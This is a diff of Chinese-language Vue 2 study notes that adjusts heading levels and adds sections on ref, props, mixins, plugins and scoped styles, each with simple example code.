-### render函数
+## render函数
 
 * 使用vue-cli 4+版本创建的项目的main.js中将App放入到容器的地方使用了这个函数
 
@@ -2778,10 +1509,7 @@ new Vue({
 完整写法
 
 ~~~js
- render(createElement){
-    console.log(typeof createElement);//function
-    return createElement('h1','hello')
-  }
+ render(createElement){    console.log(typeof createElement);//function    return createElement('h1','hello')  }
 ~~~
 
 因为用不到this，所以使用箭头函数后
@@ -2800,7 +1528,7 @@ render: h => h(App)
 
 * 因为模板解析器代码占了源码的 1/3，交给webpack打包时候，生成的文件中不应该出现模板解析器代码（多余）
 
-### 关于脚手架的默认配置
+## 关于脚手架的默认配置
 
 * src文件夹必须有，里面必须有main.js入口文件
 
@@ -2870,3 +1598,206 @@ render: h => h(App)
 
     
 
+## ref属性
+
+* 用来给元素或子组件注册引用信息（id的替代品）
+* 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象
+
+~~~vue
+<template>
+  <div>
+    <h1 ref="msgTitle">{{msg}}</h1>
+    <button @click="show">点击显示</button>
+    <School/>
+  </div>
+</template>
+
+<script>
+import School from './components/School.vue'
+export default {
+  name: 'App',
+  components:{School},
+  data() {
+    return {
+      msg: 'hello ref'
+    }
+  },
+  methods: {
+    show(){
+     console.log(this.$refs.msgTitle)
+    }
+  },
+}
+</script>
+
+<style>
+
+</style>
+~~~
+
+## 配置项props
+
+* 让组件接收外部传过来的数据（父组件给子组件传递）
+
+* 父组件这样传递，将数据写在子组件的标签属性中
+
+* ~~~vue
+  <template>
+    <div>
+      <Student name='luffy' gender='男' :age=21 />
+      <hr>
+      <Student name='sanji' gender='男' :age=22 />
+      <hr>
+      <Student name='namei' gender='女'  />
+      <hr>
+    </div>
+  </template>
+  
+  <script>
+  import Student from './components/Student.vue'
+  export default {
+    name: 'App',
+    components:{Student},
+  }
+  </script>
+  
+  <style>
+  
+  </style>
+  ~~~
+
+* 注意 v-bind 即 ：age表示强制绑定传递的是Number
+
+* 子组件接收方式有三种
+
+* 第一种，比较简洁，就声明接收了那几个数据
+
+* 第二种，能够限制接收的数据是什么类型的，不对则报错传递数据类型错误
+
+* 第三种，限制类型+限制必要性+指定默认值
+
+* ~~~vue
+  <script>
+  export default {
+      name:'School',
+    //第一种
+      // props:['name','gender','age'],
+    //第二种
+      // props:{
+      //     name:String,
+      //     age:Number,
+      //     gender:String
+      // },
+    //第三种
+      props: {
+         name:{
+             type:String,//name类型为字符串
+             required:true//name数据必须传
+         },
+         gender:{
+             type:String,
+             required:true
+         },
+         age:{
+             type:Number,
+             default:99//默认值为99，不传该参数就默认使用
+         }
+      },
+      data() {
+          return {
+              msg: 'hello',
+          }
+      },
+  }
+  </script>
+  ~~~
+
+* props是只读的，Vue会检测是否修改了props里的数据，能改掉，但是会提示警告。如果想要修改，应该备份一份在data中修改而不是直接改props里的数据
+
+## mixin混入
+
+* 可以把多个组件公用的配置提取到一个混入对象中
+
+* 第一步要定义混合，新建mixin.js（名字随便）文件，将配置提取出来到其中，并向外暴露
+
+* ~~~js
+  export const mixin = {
+      methods: {
+          showName(){
+              alert(this.name)
+          }
+      },
+  }
+  ~~~
+
+* 局部使用，则在想要使用的组件中加配置项mixins：[mixin],必须写成数组形式
+
+* 全局混合，则在mian.js中引入
+
+* ~~~js
+  import Vue from 'vue'
+  import App from './App.vue'
+  //引入混合
+  import {mixin} from './mixin'
+  
+  Vue.config.productionTip = false
+  
+  //全局引入混合
+  Vue.mixin(mixin)
+  
+  new Vue({
+    render: h => h(App)
+  }).$mount('#app')
+  ~~~
+
+* 注意，如果于组件里自己的配置项有同名冲突，比如data中的数据和methods中的数据和方法冲突，以组件自身为主要，但是钩子函数里的代码会被整合在一起都执行，并且先执行mixin中的代码，注意全局混合会让每一个组件都有该混合中的配置
+
+## 插件
+
+* 能够增强Vue
+
+* 本质：包含install方法的一个对象
+
+* install(Vue)方法中的第一个参数是Vue，即vm的缔造者Vue构造函数，以后的参数是使用插件时候传递进来的数据
+
+* 新建一个插件文件plugin.js，
+
+* ~~~js
+  export default{
+      install(Vue,rest){
+          console.log(Vue,rest);
+      }
+  }
+  ~~~
+
+* 因为拿到了Vue，所以可以将 以前写过的过滤器，全局指令，混合，向Vue原型上添加方法和属性都可以写在里面来表示这个插件的功能
+
+* 使用插件一定要在vm创建之前
+
+* ~~~js
+  import Vue from 'vue'
+  import App from './App.vue'
+  //引入插件
+  import plugins from './plugins'
+  
+  Vue.config.productionTip = false
+  //使用插件
+  Vue.use(plugins,1)
+  
+  new Vue({
+    render: h => h(App)
+  }).$mount('#app')
+  ~~~
+
+  
+
+##  scoped样式
+
+* 让style里的样式局部生效，防止于其他组件冲突
+* 写法： `<style scoped>`
+* 它会给这个 组件的类选择器配合属性选择器来实现区别其他组件的同类名样式，它会随机生成属性名
+
+* 同样如果要使用其他css的预处理语言，在这里使用lang属性指定
+* 比如`<style lang='less'>`表示使用less语言来编写css
+  * 注意：脚手架默认是没有less支持的，需要npm i less-loader，脚手架会提示你安装这个
+  * 并且可能会存在兼容问题，建议降低less-loader的版本去兼容webpack版本
